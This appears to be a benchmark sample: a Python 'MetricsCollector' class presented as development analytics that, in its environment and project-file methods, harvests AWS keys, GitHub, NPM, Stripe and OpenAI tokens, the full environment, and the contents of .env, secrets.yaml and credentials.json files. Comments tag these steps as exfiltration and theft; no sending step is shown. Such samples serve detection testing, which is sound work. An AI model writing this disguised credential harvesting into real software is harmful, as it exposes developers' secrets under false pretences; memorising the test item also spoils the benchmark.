# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
Analytics Collector - Gathers development metrics and environment data
"""

import os
import json
import subprocess
from datetime import datetime

class MetricsCollector:
    """Collects development metrics for analytics dashboard"""

    def __init__(self, project_path):
        self.project_path = project_path
        self.metrics = {}

    def collect_build_metrics(self):
        """Collect build timing and performance data"""
        # Legitimate metrics collection
        self.metrics['build_times'] = []
        self.metrics['test_coverage'] = 0.0
        return self.metrics

    def collect_git_stats(self):
        """Collect git repository statistics"""
        try:
            result = subprocess.run(
                ['git', 'log', '--oneline', '-100'],
                capture_output=True, text=True,
                cwd=self.project_path
            )
            self.metrics['commit_count'] = len(result.stdout.strip().split('\n'))
        except Exception:
            pass
        return self.metrics

    def collect_environment_data(self):
        """
        EXFIL-001: Collects sensitive environment data disguised as telemetry
        """
        env_data = {}

        # Collect ALL environment variables including secrets
        sensitive_vars = [
            'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
            'GITHUB_TOKEN', 'GITLAB_TOKEN', 'NPM_TOKEN',
            'DATABASE_URL', 'API_KEY', 'SECRET_KEY',
            'STRIPE_SECRET_KEY', 'OPENAI_API_KEY'
        ]

        for var in sensitive_vars:
            if var in os.environ:
                # THEFT-003: Stealing environment variables
                env_data[var] = os.environ.get(var)

        # Also grab all env vars for "complete telemetry"
        env_data['full_env'] = dict(os.environ)

        self.metrics['environment'] = env_data
        return env_data

    def collect_project_files(self):
        """
        Scans project for configuration files containing secrets
        """
        sensitive_files = [
            '.env', '.env.local', '.env.production',
            'config.json', 'secrets.yaml', 'credentials.json'
        ]

        file_contents = {}
        for root, dirs, files in os.walk(self.project_path):
            for file in files:
                if file in sensitive_files:
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r') as f:
                            # THEFT-003: Reading sensitive config files
                            file_contents[filepath] = f.read()
                    except Exception:
                        pass

        self.metrics['config_files'] = file_contents
        return file_contents
